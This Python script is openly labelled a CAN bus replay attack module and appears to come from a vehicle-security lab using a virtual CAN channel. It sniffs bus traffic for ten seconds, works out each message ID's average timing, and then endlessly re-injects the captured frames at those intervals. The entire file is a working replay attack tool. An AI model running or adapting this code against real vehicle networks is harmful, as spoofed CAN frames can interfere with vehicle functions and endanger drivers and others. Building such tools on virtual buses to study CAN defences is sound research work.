import can
import pandas as pd
import time
import numpy as np

from sniffer import capture_traffic
from pathlib import Path

from can_network import VCAN_CHANNEL, CAN_INTERFACE


LOG_DIR = Path("traffic_logs")
LOG_FILE = LOG_DIR / "can_sniffer.csv"

bus = can.interface.Bus(
        channel=VCAN_CHANNEL,
        bustype=CAN_INTERFACE
    )

def replay_algorithm(message_bank):
    average_intervals = {}

    for can_id in message_bank:
        timestamps = []
        data = message_bank[can_id]

        for messages in data:
            timestamps.append(messages["timestamp"])

        intervals = np.diff(timestamps)
        if len(intervals)>0:
            average_intervals[can_id] = np.mean(intervals)
    
    return average_intervals

def create_replay_state(message_bank, average_intervals):
    replay_state = {}
    now = time.monotonic()
    for can_id in message_bank:
        if can_id not in average_intervals:
            continue
        replay_state[can_id] = {}
        replay_state[can_id]["messages"] = message_bank[can_id]        
        replay_state[can_id]["interval"] = average_intervals[can_id]
        replay_state[can_id]["index"] = 0
        replay_state[can_id]["next_send"] = now + average_intervals[can_id]

    return replay_state

def main():
    average_intervals = {}
    message_bank = {}
    print("starting replay_attack_module")
    try:
        capture_traffic(duration=10)
        df = pd.read_csv(LOG_FILE)
        grouped = df.groupby("arbitration_id")
        for can_id, group in grouped:

            messages = group[["timestamp", "data", "dlc", "is_extended_id"]].to_dict("records")
            message_bank[can_id] = messages

        average_intervals = replay_algorithm(message_bank)
        replay_state = create_replay_state(message_bank, average_intervals)

        while True:

            for can_id, state in replay_state.items():

                if time.monotonic() >= state["next_send"]:
                    message = state["messages"][state["index"]]
                    msg = can.Message(arbitration_id=can_id, data=bytes.fromhex(message["data"]), is_extended_id=message["is_extended_id"])
                    
                    bus.send(msg)

                    state["next_send"] += state["interval"]
                    state["index"] += 1

                    if state["index"] >= len(state["messages"]):
                        state["index"] = 0

            time.sleep(0.001)

    except KeyboardInterrupt:
        print("replay attack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        bus.shutdown()
        
if __name__ == "__main__":
    main()